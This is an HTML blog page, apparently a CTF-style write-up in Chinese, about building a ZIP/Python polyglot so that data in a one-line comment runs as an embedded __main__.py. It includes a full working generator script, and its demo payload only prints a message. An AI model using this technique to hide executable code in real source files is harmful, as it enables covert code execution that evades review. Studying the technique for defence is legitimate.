<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <title>Executing arbitrary Python code from a comment | My New Hugo Site</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1">
    <meta name="description" content="通过注释执行任意Python代码
问题描述
Q: 只能控制一行的.py代码中注释的内容(\n\r均会被替换为空字符), 如何执行任意代码?
A: 在注释#中, 构造一个.zip 文件, python 会将该内容当成一个zip包执行, 触发任意代码执行
解决方案


从 Python 3.5 起, 可以直接执行一个 .zip 文件
python myapp.zip
前提是ZIP 包中包含一个顶层的__main__.py文件, Python 会把它当作 zipapp, 自动解压并运行__main__.py

Python 会从末尾找到 ZIP 的目录结构, 而不是依赖文件头, 所以前面的“垃圾”字节会被忽略


Python 源码中的任何行, 只要以 # 开头, 解释器都会忽略后面内容, 因此可以:

把 ZIP 文件的数据藏在 Python 源码中的注释中（开头加 #）
把 ZIP 数据直接拼接在 Python 文件的后面, 只保证文件头部分是合法 Python
ZIP 不关心前缀, Python 只要最前面是有效源码, 也不会管后面

难点
ZIP 文件头包含二进制字段，比如

偏移量（文件数据相对于 ZIP 开头的位置）
长度（文件名长度、注释长度等）
这些值写死在 header 里, 是十六进制整数
如果这些字节中出现了像 \x00、\xFF 等非 ASCII 内容, Python 就不能把它当注释

解决方法: 暴力穷举合法组合">
    <meta name="generator" content="Hugo 0.148.2">
    
    
    
      <meta name="robots" content="noindex, nofollow">
    
    

    
<link rel="stylesheet" href="/ananke/css/main.min.css" >




    


    
      

    

    

    
      <link rel="canonical" href="http://localhost:1313/posts/python-execute-comment/">
    

    <meta property="og:url" content="http://localhost:1313/posts/python-execute-comment/">
  <meta property="og:site_name" content="My New Hugo Site">
  <meta property="og:title" content="Executing arbitrary Python code from a comment">
  <meta property="og:description" content="通过注释执行任意Python代码
问题描述 Q: 只能控制一行的.py代码中注释的内容(\n\r均会被替换为空字符), 如何执行任意代码?
A: 在注释#中, 构造一个.zip 文件, python 会将该内容当成一个zip包执行, 触发任意代码执行
解决方案 从 Python 3.5 起, 可以直接执行一个 .zip 文件
python myapp.zip 前提是ZIP 包中包含一个顶层的__main__.py文件, Python 会把它当作 zipapp, 自动解压并运行__main__.py
Python 会从末尾找到 ZIP 的目录结构, 而不是依赖文件头, 所以前面的“垃圾”字节会被忽略
Python 源码中的任何行, 只要以 # 开头, 解释器都会忽略后面内容, 因此可以:
把 ZIP 文件的数据藏在 Python 源码中的注释中（开头加 #） 把 ZIP 数据直接拼接在 Python 文件的后面, 只保证文件头部分是合法 Python ZIP 不关心前缀, Python 只要最前面是有效源码, 也不会管后面 难点 ZIP 文件头包含二进制字段，比如
偏移量（文件数据相对于 ZIP 开头的位置） 长度（文件名长度、注释长度等） 这些值写死在 header 里, 是十六进制整数 如果这些字节中出现了像 \x00、\xFF 等非 ASCII 内容, Python 就不能把它当注释 解决方法: 暴力穷举合法组合">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-08-04T10:30:00+08:00">
    <meta property="article:modified_time" content="2025-08-04T10:30:00+08:00">

  <meta itemprop="name" content="Executing arbitrary Python code from a comment">
  <meta itemprop="description" content="通过注释执行任意Python代码
问题描述 Q: 只能控制一行的.py代码中注释的内容(\n\r均会被替换为空字符), 如何执行任意代码?
A: 在注释#中, 构造一个.zip 文件, python 会将该内容当成一个zip包执行, 触发任意代码执行
解决方案 从 Python 3.5 起, 可以直接执行一个 .zip 文件
python myapp.zip 前提是ZIP 包中包含一个顶层的__main__.py文件, Python 会把它当作 zipapp, 自动解压并运行__main__.py
Python 会从末尾找到 ZIP 的目录结构, 而不是依赖文件头, 所以前面的“垃圾”字节会被忽略
Python 源码中的任何行, 只要以 # 开头, 解释器都会忽略后面内容, 因此可以:
把 ZIP 文件的数据藏在 Python 源码中的注释中（开头加 #） 把 ZIP 数据直接拼接在 Python 文件的后面, 只保证文件头部分是合法 Python ZIP 不关心前缀, Python 只要最前面是有效源码, 也不会管后面 难点 ZIP 文件头包含二进制字段，比如
偏移量（文件数据相对于 ZIP 开头的位置） 长度（文件名长度、注释长度等） 这些值写死在 header 里, 是十六进制整数 如果这些字节中出现了像 \x00、\xFF 等非 ASCII 内容, Python 就不能把它当注释 解决方法: 暴力穷举合法组合">
  <meta itemprop="datePublished" content="2025-08-04T10:30:00+08:00">
  <meta itemprop="dateModified" content="2025-08-04T10:30:00+08:00">
  <meta itemprop="wordCount" content="561">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Executing arbitrary Python code from a comment">
  <meta name="twitter:description" content="通过注释执行任意Python代码
问题描述 Q: 只能控制一行的.py代码中注释的内容(\n\r均会被替换为空字符), 如何执行任意代码?
A: 在注释#中, 构造一个.zip 文件, python 会将该内容当成一个zip包执行, 触发任意代码执行
解决方案 从 Python 3.5 起, 可以直接执行一个 .zip 文件
python myapp.zip 前提是ZIP 包中包含一个顶层的__main__.py文件, Python 会把它当作 zipapp, 自动解压并运行__main__.py
Python 会从末尾找到 ZIP 的目录结构, 而不是依赖文件头, 所以前面的“垃圾”字节会被忽略
Python 源码中的任何行, 只要以 # 开头, 解释器都会忽略后面内容, 因此可以:
把 ZIP 文件的数据藏在 Python 源码中的注释中（开头加 #） 把 ZIP 数据直接拼接在 Python 文件的后面, 只保证文件头部分是合法 Python ZIP 不关心前缀, Python 只要最前面是有效源码, 也不会管后面 难点 ZIP 文件头包含二进制字段，比如
偏移量（文件数据相对于 ZIP 开头的位置） 长度（文件名长度、注释长度等） 这些值写死在 header 里, 是十六进制整数 如果这些字节中出现了像 \x00、\xFF 等非 ASCII 内容, Python 就不能把它当注释 解决方法: 暴力穷举合法组合">

	
  </head><body class="ma0 avenir bg-near-white development">

    
   
  

  <header>
    <div class="bg-black">
      <nav class="pv3 ph3 ph4-ns" role="navigation">
  <div class="flex-l center items-center justify-between">
    <a href="/" class="f3 fw2 hover-white white-90 dib no-underline">
      
        My New Hugo Site
      
    </a>
    <div class="flex-l items-center">
      

      
      <div class="ananke-socials"></div>

    </div>
  </div>
</nav>

    </div>
  </header>



    <main class="pb7" role="main">
      
  
  
  <article class="flex-l mw8 center ph3 flex-wrap justify-between">
    <header class="mt4 w-100">
      <aside class="instapaper_ignoref b helvetica tracked ttu">
          
        Posts
      </aside><div id="sharing" class="mt3 ananke-socials"></div>
<h1 class="f1 athelas mt3 mb1">Executing arbitrary Python code from a comment</h1>
      
      
      
      <time class="f6 mv4 dib tracked" datetime="2025-08-04T10:30:00+08:00">August 4, 2025</time>
      

      
      
    </header>
    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><p>通过注释执行任意Python代码</p>
<h3 id="问题描述">问题描述</h3>
<p>Q: 只能控制一行的.py代码中注释的内容(\n\r均会被替换为空字符), 如何执行任意代码?<br>
A: 在注释#中, 构造一个.zip 文件, python 会将该内容当成一个zip包执行, 触发任意代码执行</p>
<h3 id="解决方案">解决方案</h3>
<ul>
<li>
<p>从 Python 3.5 起, 可以直接执行一个 .zip 文件</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>python myapp<span style="color:#f92672">.</span>zip
</span></span></code></pre></div><p>前提是ZIP 包中包含一个顶层的<code>__main__.py</code>文件, Python 会把它当作 zipapp, 自动解压并运行<code>__main__.py</code></p>
<blockquote>
<p>Python 会从末尾找到 ZIP 的目录结构, 而不是依赖文件头, 所以前面的“垃圾”字节会被忽略</p></blockquote>
</li>
</ul>
<p>Python 源码中的任何行, 只要以 # 开头, 解释器都会忽略后面内容, 因此可以:</p>
<ul>
<li>把 ZIP 文件的数据藏在 Python 源码中的注释中（开头加 #）</li>
<li>把 ZIP 数据直接拼接在 Python 文件的后面, 只保证文件头部分是合法 Python</li>
<li>ZIP 不关心前缀, Python 只要最前面是有效源码, 也不会管后面</li>
</ul>
<h3 id="难点">难点</h3>
<p>ZIP 文件头包含<strong>二进制字段</strong>，比如</p>
<ul>
<li>偏移量（文件数据相对于 ZIP 开头的位置）</li>
<li>长度（文件名长度、注释长度等）</li>
<li>这些值写死在 header 里, 是十六进制整数</li>
<li>如果这些字节中出现了像 \x00、\xFF 等非 ASCII 内容, Python 就不能把它当注释</li>
</ul>
<p>解决方法: 暴力穷举合法组合</p>
<p>想办法 <strong>调整偏移值和结构位置</strong>，使得最终写出来的 ZIP 文件</p>
<ul>
<li>所有的字段值都转化为 可打印字符（ASCII 范围内）</li>
<li>所有 binary 字段看起来都像合法的注释字符串
于是用 <code>itertools.product(range(256), repeat=2)</code> 暴力尝试偏移组合，只要碰巧生成的 ZIP 包所有关键字节都在可打印范围内（ASCII 32~126），就认为成功。</li>
</ul>
<p>下面是<code>generate_polygloy_zip.py</code>代码, 会生成一个符合要求的<code>polygloy.py</code>代码, 最后运行该代码, 可以执行Body里面的内容<code>BODY = b&quot;print('FROM MAIN.py FILE!!!')#&quot;</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e"># struct: 按字节结构打包数据，方便构造 ZIP 文件二进制头</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># itertools: 用来暴力枚举 CRC 校验和后缀（确保安全ASCII）</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># zlib: 计算 CRC32 校验和</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct<span style="color:#f92672">,</span> itertools<span style="color:#f92672">,</span> zlib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 文件开头代码</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># encode(): Unicode 字符串 -&gt; bytes 字节串</span>
</span></span><span style="display:flex;"><span>JUNK_HEAD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;print(&#34;Hello World!&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># This is a comment. Here&#39;s another:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># &#34;&#34;&#34;</span><span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 文件结尾代码</span>
</span></span><span style="display:flex;"><span>JUNK_TAIL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print(&#34;Thanks for playing!&#34;)&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># zip 文件核心代码</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># b: 字节串</span>
</span></span><span style="display:flex;"><span>FILENAME <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;__main__.py&#34;</span>
</span></span><span style="display:flex;"><span>BODY <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;print(&#39;FROM MAIN.py FILE!!!&#39;)#&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 校验 CRC 是否为 ASCII-safe</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ascii_safe</span>(x: int) <span style="color:#f92672">-&gt;</span> bool:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> all(((x <span style="color:#f92672">&gt;&gt;</span> (<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span>i)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x80</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 检查 32 位整数的四个字节，每个字节最高位（0x80）是否为 0，即是否为 ASCII 范围内的字节</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_suffix</span>(core: bytes, length: int <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">-&gt;</span> tuple[bytes, int]:
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - ZIP 文件 CRC32 计算结果必须 ASCII-safe（低于 0x80）
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - 这里用暴力方法，给 payload 后面加4字节后缀，找到合适的后缀让 CRC32 满足 ASCII-safe 条件
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    printable <span style="color:#f92672">=</span> range(<span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x7f</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> tail <span style="color:#f92672">in</span> itertools<span style="color:#f92672">.</span>product(printable, repeat<span style="color:#f92672">=</span>length):
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> core <span style="color:#f92672">+</span> bytes(tail)
</span></span><span style="display:flex;"><span>        crc <span style="color:#f92672">=</span> zlib<span style="color:#f92672">.</span>crc32(payload) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ascii_safe(crc):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> bytes(tail), crc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">RuntimeError</span>(<span style="color:#e6db74">&#34;No ASCII-safe CRC found.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 计算最终 payload</span>
</span></span><span style="display:flex;"><span>SUFFIX, CRC <span style="color:#f92672">=</span> find_suffix(BODY)
</span></span><span style="display:flex;"><span>PAYLOAD <span style="color:#f92672">=</span> BODY <span style="color:#f92672">+</span> SUFFIX
</span></span><span style="display:flex;"><span>SIZE <span style="color:#f92672">=</span> len(PAYLOAD)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">le32</span>(x): <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, x) <span style="color:#75715e"># 4字节小端无符号整数</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">le16</span>(x): <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;H&#34;</span>, x) <span style="color:#75715e"># 2字节小端无符号整数</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ZIP 结构中各签名常量</span>
</span></span><span style="display:flex;"><span>SIG_LFH  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x04034B50</span> <span style="color:#75715e"># 本地文件头 Local File Header</span>
</span></span><span style="display:flex;"><span>SIG_CDH  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x02014B50</span> <span style="color:#75715e"># 中央目录头 Central Directory Header</span>
</span></span><span style="display:flex;"><span>SIG_EOCD <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x06054B50</span> <span style="color:#75715e"># 结束目录头 End of Central Directory</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># zip 文件偏移量设置</span>
</span></span><span style="display:flex;"><span>delta <span style="color:#f92672">=</span> len(JUNK_HEAD)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 构建 Local File Header</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Local File Header 是 ZIP 格式中的一部分，告诉解压程序该文件的元信息
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- version needed to extract，flags，compression method 等字段置 0 表示无压缩，简单存储
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- CRC32、压缩大小、解压大小都是我们计算的
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- 文件名长度和文件名
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>lfh <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>    le32(SIG_LFH) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    le32(CRC) <span style="color:#f92672">+</span> le32(SIZE) <span style="color:#f92672">+</span> le32(SIZE) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    le16(len(FILENAME)) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    FILENAME
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 构建 Central Directory Header</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- Central Directory 是 ZIP 文件目录结构，记录每个文件信息和偏移，
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- 其中重要的是 relative offset of LFH，也就是 Local File Header 在整个 ZIP 文件里的偏移，必须加上 delta
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>cdh <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>    le32(SIG_CDH) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    le32(CRC) <span style="color:#f92672">+</span> le32(SIZE) <span style="color:#f92672">+</span> le32(SIZE) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    le16(len(FILENAME)) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le32(delta) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    FILENAME
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 确保偏移量 ASCII-safe</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- ZIP 目录偏移需要是 ASCII 字节，否则写入 .py 文件时会出错
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- 这里通过填充若干 </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> 字节，保证偏移合法
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>cd_offset <span style="color:#f92672">=</span> delta <span style="color:#f92672">+</span> len(lfh) <span style="color:#f92672">+</span> len(PAYLOAD)
</span></span><span style="display:flex;"><span>pad <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> ascii_safe(cd_offset <span style="color:#f92672">+</span> pad):
</span></span><span style="display:flex;"><span>    pad <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> pad
</span></span><span style="display:flex;"><span>cd_offset <span style="color:#f92672">+=</span> pad
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 构建 End of Central Directory Header</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOCD 记录 ZIP 中央目录大小、偏移及注释长度等信息
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>eocd <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>    le32(SIG_EOCD) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    le16(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> le16(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    le32(len(cdh)) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    le32(cd_offset) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    le16(len(JUNK_TAIL))
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 拼接完整 ZIP 内容</span>
</span></span><span style="display:flex;"><span>zip_bytes <span style="color:#f92672">=</span> lfh <span style="color:#f92672">+</span> PAYLOAD <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> cdh <span style="color:#f92672">+</span> eocd
</span></span><span style="display:flex;"><span>zip_bytes <span style="color:#f92672">=</span> bytearray(zip_bytes)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> all(b <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x80</span> <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> zip_bytes), <span style="color:#e6db74">&#34;非 ASCII 字节存在&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 写入 polyglot.py 文件</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;polyglot.py&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(JUNK_HEAD <span style="color:#f92672">+</span> zip_bytes <span style="color:#f92672">+</span> JUNK_TAIL<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 运行提示</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;✅ polyglot.py 生成完毕。运行它即可执行嵌入的 __main__.py 内容：&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;  $ python3 polyglot.py&#34;</span>)
</span></span></code></pre></div><ul class="pa0">
  
</ul>
<div class="mt6 instapaper_ignoref">
      
      
      </div>
    </div>

    <aside class="w-30-l mt6-l">




</aside>

  </article>

    </main>
    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
  <div class="flex justify-between">
  <a class="f4 fw4 hover-white white-70 dn dib-ns pv2 ph3 no-underline" href="http://localhost:1313/" >
    &copy;  My New Hugo Site 2025 
  </a>
    <div><div class="ananke-socials"></div>
</div>
  </div>
</footer>

  </body>
</html>
